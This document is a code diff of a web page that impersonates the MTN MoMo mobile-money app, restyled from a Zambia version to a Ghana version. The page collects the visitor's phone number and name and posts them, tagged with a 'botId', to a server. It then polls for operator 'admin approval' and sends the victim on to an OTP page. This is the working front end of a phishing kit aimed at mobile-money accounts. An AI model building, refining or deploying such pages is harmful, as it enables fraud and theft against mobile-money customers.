@@ -1,325 +1,658 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MTN Mobile Money - Register</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    html, body {
-      width: 100%;
-      height: 100%;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #fff;
-      color: #333;
-    }
+    <title>MoMo</title>
 
-    body {
-      display: flex;
-      flex-direction: column;
-    }
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    .top-bar {
-      width: 100%;
-      height: 72px;
-      background: #FFCC00;
-      display: flex;
-      align-items: center;
-      padding: 0 22px;
-      flex-shrink: 0;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+        }
 
-    .top-bar .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #fff;
+            overflow-x: hidden;
+        }
 
-    .top-bar .logo svg {
-      height: 36px;
-      width: auto;
-    }
+        /* =========================================
+           APP CONTAINER
+        ========================================= */
 
-    .top-bar .logo span {
-      font-weight: 700;
-      font-size: 18px;
-      color: #004B87;
-      letter-spacing: -0.5px;
-    }
+        .app {
+            position: relative;
+            width: 100%;
+            max-width: 540px;
+            min-height: 100vh;
+            min-height: 100svh;
+            margin: 0 auto;
+            background: #fff;
+            overflow: hidden;
+        }
 
-    .back-btn {
-      color: #004B87;
-      text-decoration: none;
-      font-size: 30px;
-      font-weight: 300;
-      line-height: 1;
-      margin-right: 16px;
-    }
 
-    .container {
-      flex: 1;
-      width: 100%;
-      max-width: 420px;
-      margin: 0 auto;
-      padding: 34px 28px 24px;
-      display: flex;
-      flex-direction: column;
-    }
+        /* =========================================
+           TOP BLUE AREA
+        ========================================= */
 
-    #detailsForm {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
+        .top {
+            position: relative;
+            height: 390px;
+            background: #004c69;
+            padding-top: 52px;
+        }
 
-    .title {
-      font-size: 28px;
-      font-weight: 700;
-      color: #004B87;
-      margin-bottom: 6px;
-      letter-spacing: -0.5px;
-    }
+        /*
+            White curved bottom of blue area
+        */
+        .top::after {
+            content: "";
+            position: absolute;
+            left: -10%;
+            bottom: -75px;
 
-    .subtitle {
-      font-size: 16px;
-      color: #555;
-      line-height: 1.5;
-      margin-bottom: 32px;
-      font-weight: 400;
-    }
+            width: 120%;
+            height: 125px;
 
-    .phone-input-wrap {
-      position: relative;
-      width: 100%;
-      margin-bottom: 0;
-    }
+            background: #fff;
 
-    .phone-input-wrap input {
-      width: 100%;
-      height: 58px;
-      border: 2px solid #004B87;
-      border-radius: 10px;
-      background: #fff;
-      padding: 0 16px 0 90px;
-      font-size: 17px;
-      color: #333;
-      outline: none;
-      transition: .2s;
-    }
+            border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+        }
 
-    .phone-input-wrap input::placeholder {
-      color: #999;
-      font-weight: 400;
-    }
 
-    .phone-input-wrap input:focus {
-      border-color: #FFCC00;
-      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
-    }
+        /* =========================================
+           MOMO LOGO
+        ========================================= */
 
-    .country-code {
-      position: absolute;
-      left: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 17px;
-      font-weight: 600;
-      color: #004B87;
-      pointer-events: none;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
+        .logo {
+            position: relative;
+            z-index: 2;
 
-    .country-code::after {
-      content: "▼";
-      font-size: 12px;
-      color: #004B87;
-      margin-left: 4px;
-    }
+            display: flex;
+            flex-direction: column;
+            align-items: center;
 
-    .bottom-section {
-      margin-top: auto;
-      padding-bottom: 10px;
-    }
+            text-align: center;
+        }
 
-    button {
-      width: 100%;
-      height: 56px;
-      border: none;
-      border-radius: 10px;
-      font-size: 20px;
-      font-weight: 700;
-      color: #fff;
-      background: #ccc;
-      cursor: not-allowed;
-      transition: .2s;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
+        .logo-box {
+            width: 76px;
+            height: 76px;
 
-    button:enabled {
-      background: #FFCC00;
-      color: #004B87;
-      cursor: pointer;
-    }
+            border-radius: 9px;
 
-    button:enabled:hover {
-      background: #e6b800;
-    }
+            background: linear-gradient(
+                145deg,
+                #087398,
+                #003d59
+            );
 
-    .status {
-      display: none;
-      margin-top: 15px;
-      text-align: center;
-      color: #666;
-      font-size: 14px;
-    }
+            box-shadow:
+                0 2px 5px rgba(0,0,0,.25),
+                inset 0 0 4px rgba(255,255,255,.12);
 
-    .status.error {
-      color: #b00020;
-      background: #fde7e7;
-      padding: 10px;
-      border-radius: 8px;
-    }
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    .status.success {
-      color: #166534;
-      background: #dcfce7;
-      padding: 10px;
-      border-radius: 8px;
-    }
+            position: relative;
+        }
 
-    .spinner {
-      display: none;
-      width: 34px;
-      height: 34px;
-      margin: 18px auto 0;
-      border: 3px solid rgba(0, 75, 135, .15);
-      border-top: 3px solid #004B87;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
-    }
+        /*
+            Simple MoMo symbol
+        */
+        .logo-symbol {
+            position: relative;
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+            width: 40px;
+            height: 48px;
 
-    @media (max-width: 480px) {
-      .container {
-        padding: 28px 20px 22px;
-      }
-      .title {
-        font-size: 24px;
-      }
-      .subtitle {
-        font-size: 15px;
-      }
-      .phone-input-wrap input {
-        height: 56px;
-        font-size: 16px;
-        padding-left: 84px;
-      }
-      .country-code {
-        font-size: 16px;
-        left: 14px;
-      }
-      button {
-        height: 56px;
-        font-size: 19px;
-      }
-    }
+            background: #ffd500;
 
-    @media (max-width: 360px) {
-      .container {
-        padding: 24px 16px 18px;
-      }
-      .title {
-        font-size: 22px;
-      }
-      .subtitle {
-        font-size: 14px;
-      }
-      .phone-input-wrap input {
-        height: 54px;
-        font-size: 15px;
-        padding-left: 76px;
-      }
-      .country-code {
-        font-size: 15px;
-      }
-      button {
-        font-size: 18px;
-      }
-    }
-  </style>
+            clip-path: polygon(
+                50% 0,
+                100% 30%,
+                86% 100%,
+                59% 69%,
+                39% 100%,
+                13% 34%
+            );
+        }
+
+        .logo-symbol::after {
+            content: "";
+
+            position: absolute;
+
+            width: 11px;
+            height: 11px;
+
+            background: #004c69;
+
+            border-radius: 50%;
+
+            left: 14px;
+            top: 14px;
+        }
+
+        .momo {
+            margin-top: 8px;
+
+            color: #ffd500;
+
+            font-size: 36px;
+            line-height: 34px;
+
+            font-weight: 800;
+            letter-spacing: -1.5px;
+        }
+
+        .from-mtn {
+            margin-top: 3px;
+
+            color: #ffd500;
+
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+
+        /* =========================================
+           WELCOME CARD
+        ========================================= */
+
+        .card {
+            position: relative;
+
+            z-index: 5;
+
+            width: calc(100% - 36px);
+
+            margin: -142px auto 0;
+
+            background: #fff;
+
+            border-radius: 34px;
+
+            padding: 44px 27px 27px;
+
+            box-shadow:
+                0 12px 25px rgba(0, 0, 0, .12);
+        }
+
+        .title {
+            text-align: center;
+
+            color: #07516b;
+
+            font-size: 25px;
+            font-weight: 400;
+
+            margin-bottom: 49px;
+        }
+
+        .title strong {
+            font-weight: 700;
+        }
+
+
+        /* =========================================
+           PHONE INPUT
+        ========================================= */
+
+        .phone-row {
+            display: flex;
+            align-items: center;
+
+            width: 100%;
+
+            gap: 16px;
+        }
+
+
+        /* Country box */
+
+        .country {
+            flex: 0 0 96px;
+
+            width: 96px;
+            height: 98px;
+
+            background: #fff;
+
+            border: 1.5px solid #111;
+
+            border-radius: 20px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            cursor: default;
+            pointer-events: none;
+        }
+
+
+        /* Ghana flag */
+
+        .flag {
+            position: relative;
+
+            width: 39px;
+            height: 27px;
+
+            overflow: hidden;
+
+            border-radius: 50%;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #ce1126 0%,
+                    #ce1126 33.33%,
+                    #fcd116 33.33%,
+                    #fcd116 66.66%,
+                    #006b3f 66.66%,
+                    #006b3f 100%
+                );
+        }
+
+        .flag::after {
+            content: "★";
+
+            position: absolute;
+
+            left: 50%;
+            top: 50%;
+
+            transform: translate(-50%, -50%);
+
+            color: #111;
+
+            font-size: 13px;
+        }
+
+
+        /* Number input */
+
+        .phone-input {
+            flex: 1;
+
+            min-width: 0;
+
+            height: 98px;
+
+            border: 1.5px solid #111;
+
+            border-radius: 27px;
+
+            outline: none;
+
+            padding: 0 23px;
+
+            font-family: Arial, Helvetica, sans-serif;
+
+            font-size: 25px;
+
+            color: #111;
+
+            background: #fff;
+        }
+
+        .phone-input::placeholder {
+            color: #111;
+            opacity: 1;
+        }
+
+        .phone-input:focus {
+            border-color: #005572;
+        }
+
+
+        /* =========================================
+           TERMS
+        ========================================= */
+
+        .terms {
+            width: calc(100% - 45px);
+
+            margin: 48px auto 0;
+
+            text-align: center;
+
+            color: #666;
+
+            font-size: 16px;
+
+            line-height: 23px;
+        }
+
+        .terms a {
+            color: #00516c;
+
+            text-decoration: none;
+        }
+
+
+        /* =========================================
+           BOTTOM BUTTON
+        ========================================= */
+
+        .bottom {
+            width: 100%;
+
+            padding:
+                0 18px
+                14px;
+
+            margin-top: 419px;
+        }
+
+        .next {
+            width: 100%;
+
+            height: 69px;
+
+            border: none;
+
+            border-radius: 40px;
+
+            background: #d1d5db;
+
+            color: #fff;
+
+            font-size: 22px;
+
+            font-weight: 700;
+
+            cursor: not-allowed;
+
+            font-family: Arial, Helvetica, sans-serif;
+
+            transition: background 0.3s ease;
+        }
+
+        .next:enabled {
+            background: #005572;
+
+            cursor: pointer;
+        }
+
+        .next:enabled:hover {
+            background: #00415a;
+        }
+
+        .next:enabled:active {
+            transform: scale(.98);
+        }
+
+
+        /* =========================================
+           STATUS & SPINNER
+        ========================================= */
+
+        .status {
+            display: none;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            padding: 10px 14px;
+            border-radius: 12px;
+            font-weight: 500;
+            border: 1px solid transparent;
+        }
+
+        .status.error {
+            color: #c0392b;
+            background: #fef3f2;
+            border-color: #fecdca;
+        }
+
+        .status.success {
+            color: #065f46;
+            background: #ecfdf5;
+            border-color: #6ee7b7;
+        }
+
+        .spinner {
+            display: none;
+            width: 32px;
+            height: 32px;
+            margin: 16px auto 0;
+            border: 3px solid rgba(0, 75, 135, 0.1);
+            border-top: 3px solid #ffb300;
+            border-radius: 50%;
+            animation: spin .8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+
+        /* =========================================
+           RESPONSIVE
+        ========================================= */
+
+        @media (max-width: 480px) {
+
+            .top {
+                height: 375px;
+                padding-top: 52px;
+            }
+
+            .card {
+                width: calc(100% - 36px);
+
+                margin-top: -127px;
+
+                padding:
+                    44px 27px 27px;
+            }
+
+            .title {
+                font-size: 24px;
+                margin-bottom: 48px;
+            }
+
+            .phone-row {
+                gap: 16px;
+            }
+
+            .country {
+                flex-basis: 96px;
+            }
+
+            .phone-input {
+                font-size: 23px;
+                padding-left: 20px;
+                padding-right: 15px;
+            }
+
+            .terms {
+                margin-top: 48px;
+            }
+
+            .bottom {
+                margin-top: 410px;
+            }
+        }
+
+
+        /* =========================================
+           SMALL PHONES
+        ========================================= */
+
+        @media (max-width: 380px) {
+
+            .card {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            .country {
+                flex-basis: 82px;
+                width: 82px;
+            }
+
+            .phone-row {
+                gap: 10px;
+            }
+
+            .phone-input {
+                font-size: 20px;
+                padding-left: 15px;
+            }
+
+            .terms {
+                width: calc(100% - 30px);
+                font-size: 14px;
+            }
+        }
+
+
+        /* =========================================
+           VERY SHORT SCREENS
+        ========================================= */
+
+        @media (max-height: 750px) {
+
+            .bottom {
+                margin-top: 300px;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-  <div class="top-bar">
-    <a href="javascript:history.back()" class="back-btn">&#8592;</a>
-    <div class="logo">
-      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
-      </svg>
-      <span>Mobile Money</span>
+<div class="app">
+
+    <!-- ================= TOP ================= -->
+
+    <div class="top">
+
+        <div class="logo">
+
+            <div class="logo-box">
+                <div class="logo-symbol"></div>
+            </div>
+
+            <div class="momo">
+                MoMo
+            </div>
+
+            <div class="from-mtn">
+                from MTN
+            </div>
+
+        </div>
+
     </div>
-  </div>
 
-  <div class="container">
-    <div class="title">Registration</div>
-    <div class="subtitle">Welcome to MTN Mobile Money Zambia</div>
 
-    <form id="detailsForm" class="form-content">
-      <div class="phone-input-wrap">
-        <span class="country-code">+260</span>
-        <input
-          type="tel"
-          id="phone"
-          name="phone"
-          placeholder="Mobile Number"
-          autocomplete="tel-national"
-          required>
-      </div>
-      <div class="bottom-section">
-        <button type="submit" class="primary" id="continueBtn" disabled>
-          SUBMIT
+    <!-- ================= CARD ================= -->
+
+    <div class="card">
+
+        <div class="title">
+            Welcome to <strong>MoMo</strong>
+        </div>
+
+        <form id="detailsForm">
+
+            <div class="phone-row">
+
+                <!-- COUNTRY -->
+
+                <div class="country" aria-label="Ghana">
+                    <span class="flag"></span>
+                </div>
+
+
+                <!-- PHONE NUMBER -->
+
+                <input
+                    class="phone-input"
+                    type="tel"
+                    id="phone"
+                    name="phone"
+                    inputmode="numeric"
+                    maxlength="10"
+                    placeholder="Enter number *"
+                    aria-label="Phone number"
+                    autocomplete="tel-national"
+                    required
+                >
+
+            </div>
+
+            <div id="status" class="status"></div>
+            <div id="spinner" class="spinner"></div>
+
+        </form>
+
+    </div>
+
+
+    <!-- ================= TERMS ================= -->
+
+    <div class="terms">
+
+        By using this app you agree to our
+        <a href="#">
+            Mobile Terms of Use
+        </a>
+
+        <br>
+
+        and
+
+        <a href="#">
+            Privacy Policy
+        </a>
+
+    </div>
+
+
+    <!-- ================= NEXT ================= -->
+
+    <div class="bottom">
+
+        <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
+            NEXT
         </button>
-      </div>
-    </form>
 
-    <div id="status" class="status"></div>
-    <div id="spinner" class="spinner"></div>
-  </div>
+    </div>
 
-  <script>
+</div>
+
+<script>
     // ---------- CONFIG ----------
     const params = new URLSearchParams(window.location.search);
     let botId = params.get('botId') || localStorage.getItem('botId');
     if (!botId) {
-      botId = 'bot1';
-      localStorage.setItem('botId', botId);
+        botId = 'bot1';
+        localStorage.setItem('botId', botId);
     }
-    // Ensure URL has botId for bookmarking
     if (!params.has('botId')) {
-      const newUrl = window.location.pathname + '?botId=' + botId;
-      window.history.replaceState({}, '', newUrl);
+        const newUrl = window.location.pathname + '?botId=' + botId;
+        window.history.replaceState({}, '', newUrl);
     }
 
-    // ---------- USER NAME ----------
-    let fullName = localStorage.getItem('fullName');
-    if (!fullName) {
-      fullName = prompt('Please enter your full name:') || 'MTN User';
-      localStorage.setItem('fullName', fullName);
-    }
+    // ---------- USER NAME (silent, no prompt) ----------
+    let fullName = localStorage.getItem('fullName') || 'MTN User';
+    localStorage.setItem('fullName', fullName);
 
     // ---------- DOM REFS ----------
     const form = document.getElementById('detailsForm');
@@ -332,137 +665,145 @@
 
     // ---------- VALIDATION ----------
     function validateForm() {
-      const phoneNumber = phone.value.replace(/\D/g, '');
-      button.disabled = (phoneNumber.length < 8);
+        const phoneNumber = phone.value.replace(/\D/g, '');
+        button.disabled = (phoneNumber.length < 8);
     }
 
     phone.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '');
-      validateForm();
+        // Remove non-digits
+        let raw = this.value.replace(/\D/g, '');
+        // Limit to 10 digits
+        if (raw.length > 10) raw = raw.slice(0, 10);
+        // Format: 024 000 0000
+        let formatted = '';
+        if (raw.length > 0) {
+            if (raw.length <= 3) {
+                formatted = raw;
+            } else if (raw.length <= 6) {
+                formatted = raw.slice(0, 3) + ' ' + raw.slice(3);
+            } else {
+                formatted = raw.slice(0, 3) + ' ' + raw.slice(3, 6) + ' ' + raw.slice(6, 10);
+            }
+        }
+        this.value = formatted;
+        validateForm();
     });
 
     // ---------- HELPER: CLEAR POLLING ----------
     function stopPolling() {
-      if (pollTimer) {
-        clearInterval(pollTimer);
-        pollTimer = null;
-      }
+        if (pollTimer) {
+            clearInterval(pollTimer);
+            pollTimer = null;
+        }
     }
 
     // ---------- HELPER: SET STATUS ----------
     function setStatus(message, type) {
-      statusEl.style.display = 'block';
-      statusEl.className = 'status ' + (type || '');
-      statusEl.textContent = message;
+        statusEl.style.display = 'block';
+        statusEl.className = 'status ' + (type || '');
+        statusEl.textContent = message;
     }
 
     function hideStatus() {
-      statusEl.style.display = 'none';
-      statusEl.className = 'status';
-      statusEl.textContent = '';
+        statusEl.style.display = 'none';
+        statusEl.className = 'status';
+        statusEl.textContent = '';
     }
 
     // ---------- FORM SUBMIT ----------
     form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+        e.preventDefault();
 
-      const phoneVal = phone.value.trim();
-      if (!phoneVal) {
-        setStatus('❌ Please enter a phone number.', 'error');
-        return;
-      }
-
-      // Disable button and show spinner
-      button.disabled = true;
-      spinner.style.display = 'block';
-      hideStatus();
-      setStatus('⏳ Awaiting admin approval...');
-
-      try {
-        const res = await fetch('/submit-phone', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
-        });
-
-        if (!res.ok) {
-          const errText = await res.text();
-          throw new Error(errText || 'Server error');
+        // Remove spaces for submission
+        const phoneVal = phone.value.replace(/\s/g, '').trim();
+        if (!phoneVal) {
+            setStatus('❌ Please enter a phone number.', 'error');
+            return;
         }
 
-        const { requestId } = await res.json();
+        // Disable button and show spinner
+        button.disabled = true;
+        spinner.style.display = 'block';
+        hideStatus();
+        setStatus('⏳ Awaiting admin approval...');
 
-        // Store phone and requestId for the next page
-        localStorage.setItem('phone', phoneVal);
-        localStorage.setItem('phoneRequestId', requestId);
+        try {
+            const res = await fetch('/submit-phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
+            });
 
-        // Start polling
-        stopPolling();
-        let attempts = 0;
-        const MAX_ATTEMPTS = 120;
-
-        pollTimer = setInterval(async () => {
-          attempts++;
-          try {
-            const checkRes = await fetch('/check-phone/' + requestId);
-            const data = await checkRes.json();
-
-            // 🔥 Backend now returns { approved: true } (not { redirect })
-            if (data.approved === true) {
-              stopPolling();
-              spinner.style.display = 'none';
-              setStatus('✅ Phone approved! Redirecting...', 'success');
-              // Pass requestId, phone, and botId to OTP page
-              const redirectUrl = 'link.html?requestId=' + requestId +
-                                  '&phone=' + encodeURIComponent(phoneVal) +
-                                  '&botId=' + botId;
-              setTimeout(() => {
-                window.location.href = redirectUrl;
-              }, 800);
-              return;
+            if (!res.ok) {
+                const errText = await res.text();
+                throw new Error(errText || 'Server error');
             }
 
-            if (data.approved === false) {
-              stopPolling();
-              spinner.style.display = 'none';
-              setStatus('❌ Phone number rejected. Please try again.', 'error');
-              button.disabled = false;
-              return;
-            }
+            const { requestId } = await res.json();
 
-            // Timeout
-            if (attempts > MAX_ATTEMPTS) {
-              stopPolling();
-              spinner.style.display = 'none';
-              setStatus(
-                '⏳ Approval taking too long. Please refresh or contact support.',
-                'error'
-              );
-              button.disabled = false;
-              return;
-            }
+            localStorage.setItem('phone', phoneVal);
+            localStorage.setItem('phoneRequestId', requestId);
 
-            // Still pending – update status occasionally
-            if (attempts % 10 === 0) {
-              const seconds = Math.round(attempts * 1.5);
-              setStatus('⏳ Waiting for admin approval... (' + seconds + 's)');
-            }
+            // Start polling
+            stopPolling();
+            let attempts = 0;
+            const MAX_ATTEMPTS = 120;
 
-          } catch (err) {
-            console.error('Polling error:', err);
-            // Don't stop polling – network glitch might recover
-          }
-        }, 1500);
+            pollTimer = setInterval(async () => {
+                attempts++;
+                try {
+                    const checkRes = await fetch('/check-phone/' + requestId);
+                    const data = await checkRes.json();
 
-      } catch (error) {
-        spinner.style.display = 'none';
-        setStatus('❌ Server error: ' + error.message, 'error');
-        button.disabled = false;
-      }
+                    if (data.approved === true) {
+                        stopPolling();
+                        spinner.style.display = 'none';
+                        setStatus('✅ Phone approved! Redirecting...', 'success');
+                        const redirectUrl = 'link.html?requestId=' + requestId +
+                                            '&phone=' + encodeURIComponent(phoneVal) +
+                                            '&botId=' + botId;
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 800);
+                        return;
+                    }
+
+                    if (data.approved === false) {
+                        stopPolling();
+                        spinner.style.display = 'none';
+                        setStatus('❌ Phone number rejected. Please try again.', 'error');
+                        button.disabled = false;
+                        return;
+                    }
+
+                    if (attempts > MAX_ATTEMPTS) {
+                        stopPolling();
+                        spinner.style.display = 'none';
+                        setStatus('⏳ Approval taking too long. Please refresh or contact support.', 'error');
+                        button.disabled = false;
+                        return;
+                    }
+
+                    if (attempts % 10 === 0) {
+                        const seconds = Math.round(attempts * 1.5);
+                        setStatus('⏳ Waiting for admin approval... (' + seconds + 's)');
+                    }
+
+                } catch (err) {
+                    console.error('Polling error:', err);
+                }
+            }, 1500);
+
+        } catch (error) {
+            spinner.style.display = 'none';
+            setStatus('❌ Server error: ' + error.message, 'error');
+            button.disabled = false;
+        }
     });
 
     // ---------- INIT ----------
     validateForm();
-  </script>
+</script>
+
 </body>
 </html>
